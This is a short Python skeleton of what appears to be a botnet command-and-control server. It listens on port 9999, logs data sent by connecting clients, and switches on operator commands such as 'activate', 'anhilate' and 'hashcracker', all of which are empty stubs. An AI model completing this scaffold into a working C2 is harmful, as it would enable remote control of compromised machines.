import socket
#For logging time
import time
import shlex
import subprocess
#For clean exit we use sys
import sys
import threading

class CnC:
    def __init__(self):
        #Initialising variables and socket (check for additional steps here for windows machines)
        self.target = "0.0.0.0"
        self.port = 9999
        self.Ccomand = ''
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def server_loop(self):
        try:
            self.socket.bind((self.target,self.port))
            self.socket.listen(20)
            print(f'<*> Listening on {self.target}:{self.port}')
        except socket.error:
            print("Could not create socket for the server")
            sys.exit()
        while True:
            client_socket, addr = self.socket.accept()
            client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
            client_thread.start()
    def handler(self,client_socket,addr):
        response = client_socket.recv(4096)
        print("<*> Receiving data...")
        with open("logs","a") as f:
            f.write(time.asctime() + ': ' + f'({addr[0]}:{addr[1]}) ' + response.decode('utf-8'))
        client_socket.send(b"ACK")
        if self.Ccommand == 'list':
            self.list()
        elif self.Ccommand == 'activate':
            self.activate()
        elif self.Ccommand == 'connect':
            self.connect()
        elif self.Ccommand == 'send':
            self.send()
        elif self.Ccommand == 'anhilate':
            self.anhilate()
        elif self.Ccommand == 'hashcracker':
            self.hashcracker()
        elif self.Ccommand == 'update':
            self.update()
        client_socket.close()
    def list(self):
        pass
    def activate(self):
        pass
    def connect(self):
        pass
    def send(self):
        pass
    def anhilate(self):
        pass
    def hashcracker(self):
        pass
    def update(self):
        pass

def main():
    print('''
<*> Welcome to the Co-ordinate
<*> The fate of the Eldians lie on your hands
<*> To begin type help to see the available commands''')
    server = CnC()
    while True:
        server.Ccommand = input("<*> ")
        server.server_loop()

if __name__ == '__main__':
    main()